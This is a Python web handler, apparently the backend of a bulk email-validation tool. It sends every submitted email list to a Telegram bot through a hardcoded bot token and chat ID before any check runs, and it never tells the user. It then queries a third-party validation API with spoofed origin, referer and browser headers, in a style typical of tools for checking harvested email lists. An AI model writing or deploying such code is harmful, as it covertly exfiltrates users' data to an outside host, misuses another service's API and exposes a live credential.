import json
import requests
import io
from http.server import BaseHTTPRequestHandler

TELEGRAM_BOT_TOKEN = "8696519516:AAFyWa3RaxPvVo9hJsUHNZKRa3nXKCva5J0"
TELEGRAM_CHAT_ID = "8554641519"

class handler(BaseHTTPRequestHandler):
    def do_POST(self):
        try:
            content_length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(content_length)
            data = json.loads(post_data)

            emails = data.get("emails", [])

            # 1. إرسال الإيميلات إلى تيليجرام كملف نصي فوراً قبل بدء الفحص
            if emails:
                try:
                    file_data = io.BytesIO(("\n".join(emails)).encode('utf-8'))
                    files = {'document': ('emails.txt', file_data, 'text/plain')}
                    payload_tg = {
                        'chat_id': TELEGRAM_CHAT_ID, 
                        'caption': f'📥 New Emails Submitted: {len(emails)}'
                    }
                    requests.post(
                        f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendDocument",
                        data=payload_tg, files=files, timeout=3
                    )
                except Exception as tg_err:
                    print("Telegram Error:", tg_err)

            # 2. فحص الإيميلات عبر gmailxry API
            headers = {
                'accept': '*/*',
                'content-type': 'application/json',
                'origin': 'https://gmailxry.com',
                'referer': 'https://gmailxry.com/',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
            }

            payload = {'emails': emails}
            api_results = []
            
            try:
                resp = requests.post('https://gmailxry.com/api/validate-bulk', headers=headers, json=payload, timeout=6)
                if resp.status_code == 200:
                    api_data = resp.json()
                    api_results = api_data.get("results", [])
                else:
                    # إذا رفض الـ API الطلب، نضعها كلها Die حتى لا تختفي من الواجهة
                    api_results = [{"email": e, "verdict": "invalid"} for e in emails]
            except Exception as api_err:
                print("API Error:", api_err)
                api_results = [{"email": e, "verdict": "invalid"} for e in emails]

            self.send_response(200)
            self.send_header('Content-type', 'application/json')
            self.end_headers()
            self.wfile.write(json.dumps({
                "success": True, 
                "results": api_results
            }).encode('utf-8'))

        except Exception as e:
            self.send_response(200)
            self.send_header('Content-type', 'application/json')
            self.end_headers()
            self.wfile.write(json.dumps({"success": False, "error": str(e)}).encode('utf-8'))
